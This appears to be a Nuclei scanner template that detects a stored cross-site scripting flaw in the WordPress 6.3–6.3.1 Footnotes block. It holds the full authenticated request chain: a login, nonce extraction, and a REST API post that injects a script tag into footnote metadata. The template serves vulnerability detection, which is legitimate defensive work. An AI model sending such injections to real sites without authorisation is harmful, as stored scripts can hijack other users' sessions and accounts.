http:
- extractors:
  - group: 1
    internal: true
    name: postid
    part: body_2
    regex:
    - post=(\d+)
    type: regex
  - group: 1
    internal: true
    name: nonce
    part: body_2
    regex:
    - createNonceMiddleware\(\s"(.*)\"\s\)
    type: regex
  host-redirects: true
  matchers:
  - condition: and
    dsl:
    - status_code_4 == 200
    - contains(body_4, "<script>alert(document.domain)</script>")
    - contains(header_4, "text/html")
    type: dsl
  max-redirects: 2
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Origin: {{RootURL}}

    Content-Type: application/x-www-form-urlencoded

    Cookie: wordpress_test_cookie=WP%20Cookie%20check


    log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

    '
  - 'GET /wp-admin/post-new.php HTTP/1.1

    Host: {{Hostname}}

    '
  - "POST /?rest_route=/wp/v2/posts/{{postid}} HTTP/1.1\nHost: {{Hostname}}\nContent-Type:\
    \ application/json\nX-HTTP-Method-Override: PUT\nX-WP-Nonce: {{nonce}}\n\n{\n\
    \  \"id\": {{postid}},\n  \"title\": \"Stored XSS via Footnote Block\",\n  \"\
    content\": \"<!-- wp:paragraph -->\\n<p>Test CVE<sup data-fn=\\\"testid\\\" class=\\\
    \"fn\\\"><a href=\\\"#testid\\\" id=\\\"testid-link\\\">1</a></sup></p>\\n<!--\
    \ /wp:paragraph -->\\n\\n<!-- wp:footnotes /-->\",\n  \"meta\": {\n    \"footnotes\"\
    : \"[{\\\"content\\\":\\\"<script>alert(document.domain)</script>\\\",\\\"id\\\
    \":\\\"testid\\\"}]\"\n  },\n  \"status\": \"pending\"\n}\n"
  - 'GET /?p={{postid}} HTTP/1.1

    Host: {{Hostname}}

    '
id: wp-footnote-xss
info:
  author: nqdung2002
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 6.4
    cwe-id: CWE-79
  description: 'WordPress does not escape some of its Footnotes block options before
    outputting them back in a page/post where the block is embed.

    '
  impact: 'This could allow users with the contributor role and above to perform Stored
    Cross-Site Scripting attacks.

    '
  metadata:
    framework: wordpress
    max-request: 4
  name: WordPress 6.3-6.3.1 Footnotes Block - Cross-Site Scripting
  reference:
  - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-core/wordpress-core-63-631-authenticatedcontributor-cross-site-scripting-via-footnotes-block?asset_slug=wordpress
  - https://wpscan.com/vulnerability/63270b61-dddd-4cc0-a091-a04cb4f682ec/
  severity: medium
  tags: wpscan,xss,wp,wordpress,footnote,xss,authenticated,vuln
